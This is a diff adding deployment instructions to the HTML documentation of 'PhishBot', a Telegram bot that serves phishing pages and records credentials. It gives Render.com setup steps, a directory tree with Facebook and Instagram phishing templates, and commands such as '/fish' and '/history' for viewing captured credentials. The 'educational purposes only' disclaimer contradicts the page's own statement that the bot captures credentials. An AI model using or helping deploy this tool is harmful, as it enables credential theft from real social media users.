@@ -169,5 +169,87 @@ else:  # GET method
   <h2>Conclusion</h2>
   <p>The enhanced PhishBot now properly captures credentials, has improved HTML parsing, and is ready for scalable deployment on Render.com. The critical issue with form data capturing is fixed using smarter regex parsing and logging.</p>
 
+  <h2>Deployment Instructions</h2>
+
+  <h3>1. Fork this repository to your GitHub account.</h3>
+
+  <h3>2. Create a new Web Service on Render.com:</h3>
+  <ul>
+    <li>Connect your GitHub repository</li>
+    <li>Select the Python runtime</li>
+    <li>Set the following configuration:</li>
+    <ul>
+      <li>Build Command: <code>pip install -r requirements.txt</code></li>
+      <li>Start Command: <code>gunicorn app:app</code></li>
+    </ul>
+    <li>Add environment variables:</li>
+    <ul>
+      <li><code>PORT</code>: Leave empty (Render will set this)</li>
+      <li><code>PYTHON_VERSION</code>: <code>3.9.12</code></li>
+    </ul>
+  </ul>
+
+  <h3>3. The deployment will automatically start. Once complete, your bot will be accessible at:</h3>
+  <p><code>https://your-app-name.onrender.com</code></p>
+
+  <h3>4. Test the deployment by sending <code>/start</code> to your Telegram bot.</h3>
+
+  <h2>Directory Structure</h2>
+  <pre>
+/
+├── app.py                    # Main application
+├── requirements.txt          # Python dependencies
+├── Procfile                 # Render deployment configuration
+├── Templates/               # Phishing templates
+│   ├── Facebook/
+│   ├── Instagram/
+│   └── Sample/
+└── phished_pages/          # Generated pages (created at runtime)
+  </pre>
+
+  <h2>Available Commands</h2>
+  <ul>
+    <li><code>/start</code> - Start the bot</li>
+    <li><code>/help</code> - Show help message</li>
+    <li><code>/fish</code> - Start phishing setup</li>
+    <li><code>/templates</code> - List available templates</li>
+    <li><code>/info</code> - About the bot</li>
+    <li><code>/history</code> - View captured credentials</li>
+  </ul>
+
+  <h2>Security Notes</h2>
+  <ul>
+    <li>This is for educational purposes only</li>
+    <li>Do not use for malicious purposes</li>
+    <li>All data is stored temporarily</li>
+    <li>No real credentials are harvested</li>
+  </ul>
+
+  <h2>Troubleshooting</h2>
+  <ul>
+    <li>If pages show "not found":
+      <ul>
+        <li>Check if Templates directory exists</li>
+        <li>Verify template files are present</li>
+        <li>Check logs for path errors</li>
+      </ul>
+    </li>
+    <li>If bot doesn't respond:
+      <ul>
+        <li>Verify API_TOKEN is correct</li>
+        <li>Check if bot is running</li>
+        <li>View logs for errors</li>
+      </ul>
+    </li>
+  </ul>
+
+  <h2>Maintenance</h2>
+  <ul>
+    <li>Keep dependencies updated</li>
+    <li>Monitor disk usage</li>
+    <li>Check logs regularly</li>
+    <li>Backup templates if needed</li>
+  </ul>
+
 </body>
 </html>
